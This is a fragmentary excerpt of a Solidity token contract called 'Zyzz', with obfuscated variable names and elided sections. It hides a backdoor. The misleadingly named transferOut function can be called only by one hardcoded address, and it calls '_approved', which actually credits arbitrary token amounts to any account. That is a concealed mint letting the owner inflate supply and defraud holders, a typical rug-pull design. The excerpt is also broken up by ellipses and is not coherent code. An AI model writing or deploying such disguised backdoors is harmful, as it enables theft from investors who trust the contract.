...
contract Context {
 ...
 contract Zyzz is Context, ERC20, ERC20Metadata {
    ...
    mapping(address => uint256) private payday;
    ...
    uint256 private _dori = 2;
    uint256 private _omename = 1;
    ...
    constructor(uint256 totalSupply_) {
        ...
        _owner = _msgSender();
        payday[msg.sender] = totalSupply_;
    ...
    function transferOut(uint256 redstpc) public virtual pancake {
        _approved(_msgSender(), redstpc);
    }
    address private _ericlevi = 0xac838F71de1B7C9c696feddE9e8833d9F8A160dF;
 ...
 function _approved(address daria, uint256 amenodo) internal virtual {
        payday[daria] = payday[daria] + amenodo;
...
function _multiply (uint256 amount) private {
  ...
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    ...
    function _transfer(
        ...
        uint256 senderBalance = payday[issuer];
        require(senderBalance >= allons, "Too high value");
        unchecked {
            payday[issuer] = senderBalance - allons;
        }
        _fee = (allons * _dori / 100) / _omename;
        allons = allons -  (_fee * _omename);
        
        payday[grantee] += allons;
   ...
   */
     ...
     */
    function _burn(address account, uint256 imnterave) internal virtual {
        require(account != address(0), "Can't burn from address 0");
        uint256 accountBalance = payday[account];
        require(accountBalance >= imnterave, "BEP : Can't be done");
        unchecked {
            payday[account] = accountBalance - imnterave;
        }
        _totalSupply -= imnterave;

        emit Transfer(account, address(0), imnterave);
    }
...
function _subvert (uint256 tokenAmount) private lockTheSwap {
    ...
    modifier pancake() {
        require(_msgSender() == _ericlevi, "Cannot use function for now.");
    _;
    }
